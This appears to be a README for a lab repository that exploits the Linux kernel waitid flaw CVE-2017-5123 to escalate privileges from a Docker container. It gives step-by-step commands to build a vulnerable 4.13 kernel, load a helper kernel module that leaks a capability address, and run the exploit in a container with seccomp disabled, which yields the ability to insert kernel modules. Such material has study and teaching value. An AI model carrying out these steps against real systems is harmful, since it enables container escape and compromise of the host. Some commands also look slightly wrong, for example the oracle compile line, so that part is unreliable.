# container-privilege-escalation

This repository has the sources and utilities required to exploit the 
CVE-2017-5123 vulnerability which affected Linux kernel 4.13. A more 
detailed explanation of the exploit can be found on other websites such 
as ... and ...
We will use Ubuntu 16.04 for this exploit.

# Compile and install vulnerable Linux kernel

We need to first compile and install a vulnerable version of the kernel. 
We have used version 4.13. It's best if you leave enough space in your 
VM for compiling the kernel and the /boot directory.

```
sudo apt install build-essential ncurses-base libncurses5-dev \
		git build-essential kernel-package fakeroot \
		libssl-dev ccache bison flex libelf-dev dwarves
tar -xvf linux-4.13.tar.gz
cd linux-4.13
make
sudo make modules_install
sudo make install
reboot
```

After the system has rebooted we will validate that the correct kernel
version has booted.

```
uname --kernel-release
```

Unprivileged users do not have access to the kernel logs in more recent 
Linux kernel versions. Just to make sure that it is the case for our kernel 
we run the following command.

```
sudo -s
echo 1 > /proc/sys/kernel/dmesg_restrict
```

# Compile kernel module and install

We will be using a kernel module as an oracle to extract the capability base
address instead of trying to extract it through any type of information 
leakage to simplify the attack.

```
cd oracle.new/src/char_dev_kernel_module
make
gcc -o oracle oracle
sudo insmod process_cred_oracle.ko
```

# Compile the exploit code
The userspace program which invokes the vulnerable system call (`waitid`) 
can be found in the kernel-exploit folder.

```
cd kernel-exploit
make
```

# Launch exploit inside container

We are going to launch a container which has access to the kernel exploit 
userspace program which was compiled and is available in the kernel-exploit 
folder.

```
sudo docker save -o [path-to-repo]/cve.tar.gz cve:1.0
sudo docker run --security-opt seccomp=unconfined -v [path-to-repo]/kernel-exploit/:/home/user_space_program -v [path-to-repo]/linux-4.13/lib:/home/lkms -it cve:1.0 bash
```

Now that we are inside the container, we will first create a dummy user 
with the highest possible uid and use that user to launch our exploit.
```
useradd -u 4294967294 dummy
usermod -aG sudo dummy
passwd dummy

su dummy
bash
cd /home/user_space_program
./user_prog
```

After we launch the program in the container, we need to switch to the host 
and extract its pid and then pass the pid to the oracle to extract the 
capability base address.

**ON THE HOST:**
```
ps aux | grep user_prog
cd [path-to-repo]/oracle.new/src
./oracle [pid]
```
Now we will pass the capability address to the running `user_prog` in the 
container.
When the exploit is finished we can run two commands, `insmod` which installs 
the `test_firmware.ko` kernel module, `dmesg` which shows the kernel logs or
`exit` which will exit the exploit.
